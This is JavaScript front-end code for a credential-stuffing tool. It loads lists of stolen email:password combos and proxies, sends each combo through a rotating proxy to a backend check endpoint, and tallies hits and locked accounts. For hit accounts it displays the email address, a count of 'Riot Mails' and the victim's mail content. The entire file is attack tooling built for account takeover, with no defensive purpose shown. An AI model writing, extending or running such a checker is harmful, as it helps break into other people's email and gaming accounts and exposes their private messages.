let isRunning = false;
let combos = [];
let proxies = [];
let stats = { checked: 0, hit: 0, bad: 0, locked: 0 };
let hitsData = [];

document.getElementById('file-combos').onchange = function(e) {
    const reader = new FileReader();
    reader.onload = (ev) => {
        combos = ev.target.result.split('\n').filter(l => l.includes(':'));
        document.getElementById('label-combos').innerText = `${combos.length} Accounts Loaded`;
    };
    reader.readAsText(e.target.files[0]);
};

document.getElementById('file-proxies').onchange = function(e) {
    const reader = new FileReader();
    reader.onload = (ev) => {
        proxies = ev.target.result.split('\n').filter(l => l.trim() !== '');
        document.getElementById('label-proxies').innerText = `${proxies.length} Proxies Loaded`;
    };
    reader.readAsText(e.target.files[0]);
};

async function startChecking() {
    if (combos.length === 0) return alert("Upload combo first!");
    isRunning = true;
    document.getElementById('start-btn').disabled = true;
    document.getElementById('stop-btn').disabled = false;

    for (let i = 0; i < combos.length; i++) {
        if (!isRunning) break;
        const combo = combos[i].trim();
        const proxy = proxies.length > 0 ? proxies[i % proxies.length] : null;

        try {
            const res = await fetch('/api/check', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ combo, proxy })
            });
            const data = await res.json();
            stats.checked++;
            if (data.status === 'HIT') {
                stats.hit++;
                hitsData.push(data.combo);
                addRow(data);
            } else if (data.status === 'LOCKED') { stats.locked++; }
            else { stats.bad++; }
            updateStats();
        } catch (e) { stats.bad++; updateStats(); }
    }
    isRunning = false;
    document.getElementById('start-btn').disabled = false;
}

function addRow(data) {
    const row = document.createElement('tr');
    const badge = data.isSultan ? `<span class="badge-sultan">⭐ SULTAN</span>` : `<span class="badge-hit">HIT</span>`;
    const mailId = `m_${Math.random().toString(36).substr(2, 9)}`;
    window[mailId] = data.body;

    row.innerHTML = `
        <td style="font-family:monospace">${data.combo.split(':')[0]}</td>
        <td>${badge}</td>
        <td>${data.count} Riot Mails</td>
        <td><button onclick="viewMail('${mailId}')" class="btn-primary" style="padding:4px 8px; font-size:10px">VIEW</button></td>
    `;
    document.getElementById('res-table').prepend(row);
}

function viewMail(id) {
    document.getElementById('mail-body').innerText = window[id];
    document.getElementById('emailModal').style.display = "block";
}

function closeModal() { document.getElementById('emailModal').style.display = "none"; }
function updateStats() {
    document.getElementById('s-checked').innerText = stats.checked;
    document.getElementById('s-hit').innerText = stats.hit;
    document.getElementById('s-bad').innerText = stats.bad;
    document.getElementById('s-locked').innerText = stats.locked;
}

document.getElementById('start-btn').onclick = startChecking;
document.getElementById('stop-btn').onclick = () => { isRunning = false; };
